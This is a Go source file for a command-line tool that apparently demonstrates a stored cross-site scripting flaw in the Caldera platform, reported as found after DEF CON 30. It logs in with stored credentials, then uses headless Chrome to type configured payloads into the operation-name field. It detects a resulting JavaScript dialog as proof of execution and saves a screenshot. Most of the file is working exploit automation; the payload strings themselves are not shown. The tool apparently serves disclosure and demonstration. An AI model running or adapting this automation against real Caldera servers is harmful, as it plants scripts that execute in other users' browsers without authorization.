/*
Copyright © 2022 Jayson Grace <jayson.e.grace@gmail.com>

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
*/

package cmd

import (
	"context"
	"fmt"
	"math"
	"os"

	"github.com/chromedp/cdproto/emulation"
	"github.com/chromedp/cdproto/network"
	"github.com/chromedp/cdproto/page"
	"github.com/chromedp/chromedp"
	"github.com/fatih/color"
	log "github.com/sirupsen/logrus"
	"github.com/spf13/cobra"
	"github.com/spf13/viper"
)

// StoredXSSDosCmd runs the XSS vulnerability found after DEF CON 30.
var StoredXSSDosCmd = &cobra.Command{
	Use:   "StoredXSSDos",
	Short: "Stored XSS found in addition to the previously reported one",
	Run: func(cmd *cobra.Command, args []string) {
		fmt.Println(color.YellowString(
			"Introducing stored XSS vulnerability #2, please wait..."))

		caldera.URL = viper.GetString("login_url")
		caldera.RepoPath = viper.GetString("repo_path")
		caldera.Creds, err = GetRedCreds(caldera.RepoPath)
		if err != nil {
			log.WithError(err).Errorf(
				"failed to get Caldera credentials: %v", err)
			os.Exit(1)
		}

		caldera.Driver.Headless = viper.GetBool("headless")
		driver, cancels, err := setupChrome(caldera)
		if err != nil {
			log.WithError(err).Error("failed to setup Chrome")
			os.Exit(1)
		}

		defer cancelAll(cancels)

		caldera.Driver = driver

		caldera, err = Login(caldera)
		if err != nil {
			log.WithError(err).Error("failed to login to caldera")
			os.Exit(1)
		}

		caldera.Payloads = viper.GetStringSlice("payloads")

		for _, payload := range caldera.Payloads {
			if err = storedXSSDosVuln(payload); err != nil {
				log.WithError(err).WithFields(log.Fields{
					"Payload": payload,
				}).Error("failed to introduce the vulnerability")
			}
		}
	},
}

func init() {
	rootCmd.AddCommand(StoredXSSDosCmd)
}

func storedXSSDosVuln(payload string) error {
	var buf []byte

	// Selectors for chromeDP
	pageSelector := "#nav-menu > ul:nth-child(2) > li:nth-child(4) > a"
	createOPSelector := "#select-operation > div:nth-child(3) > button"
	opNameSelector := "#op-name"
	startSelector := "#operationsPage > div > div.modal.is-active > div.modal-card > footer > nav > div.level-right > div > button"

	imagePath := viper.GetString("image_path")

	// listen network event
	listenForNetworkEvent(caldera.Driver.Context)

	// handle payloads that use alerts, prompts, etc.
	chromedp.ListenTarget(caldera.Driver.Context, func(ev interface{}) {
		if ev, ok := ev.(*page.EventJavascriptDialogOpening); ok {
			log.WithFields(log.Fields{
				"Prompt output": ev.Message,
				"Payload":       payload,
			}).Info(color.GreenString("Successfully executed payload!!\n" +
				"Closing the prompt and taking a screenshot of the aftermath"))
			go func() {
				if err := chromedp.Run(caldera.Driver.Context,
					page.HandleJavaScriptDialog(true),
				); err != nil {
					panic(err)
				}
			}()
		}
	})
	if err := chromedp.Run(caldera.Driver.Context,
		network.Enable(),
		chromedp.Click(pageSelector),
		chromedp.Sleep(Wait(1000)),
		chromedp.Click(createOPSelector),
		chromedp.SendKeys(opNameSelector, payload),
		chromedp.Click(startSelector),
		chromedp.Sleep(Wait(2000)),
		chromedp.ActionFunc(func(ctx context.Context) error {

			_, _, contentSize, _, _, _, err := page.GetLayoutMetrics().Do(ctx)
			if err != nil {
				log.WithError(err).Error("failed to get layout metrics")
				return err
			}

			width, height := int64(math.Ceil(contentSize.Width)),
				int64(math.Ceil(contentSize.Height))

			// force viewport emulation
			err = emulation.SetDeviceMetricsOverride(width, height, 1, false).
				WithScreenOrientation(&emulation.ScreenOrientation{
					Type:  emulation.OrientationTypePortraitPrimary,
					Angle: 0,
				}).Do(ctx)
			if err != nil {
				log.WithError(err).Error("failed to override device metrics")
				return err
			}

			// capture screenshot
			buf, err = page.CaptureScreenshot().
				WithQuality(100).
				WithClip(&page.Viewport{
					X:      contentSize.X,
					Y:      contentSize.Y,
					Width:  contentSize.Width,
					Height: contentSize.Height,
					Scale:  2,
				}).Do(ctx)
			if err != nil {
				log.WithError(err).Error("failed to take screenshot")
				return err
			}
			return nil
		})); err != nil {
		log.WithError(err).WithFields(log.Fields{
			"Payload": payload,
		}).Error("failed to introduce the vulnerability")
		return err
	}

	if err := os.WriteFile(imagePath+"1.png", buf, 0644); err != nil {
		log.WithError(err).Error("failed to write screenshot to disk")
		return err
	}

	return nil

}
